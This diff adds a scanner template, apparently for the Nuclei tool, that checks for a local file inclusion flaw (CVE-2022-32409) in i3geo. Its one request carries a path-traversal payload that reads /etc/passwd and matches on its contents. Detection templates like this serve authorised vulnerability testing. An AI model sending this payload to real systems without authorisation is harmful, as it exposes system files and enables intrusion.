@@ -1,0 +1,21 @@
+id: poc-yaml-portal-do-software-publico-brasileiro-i3geo-local-file-inclusion
+info:
+  name: Portal do Software Publico Brasileiro i3geo Local File Inclusion Vulnerability (CVE-2022-32409)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: lfi,CVE-2022-32409
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/i3geo/exemplos/codemirror.php?&pagina=../../../../../../../../../../../../../../../../../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+          - "i3GEO"
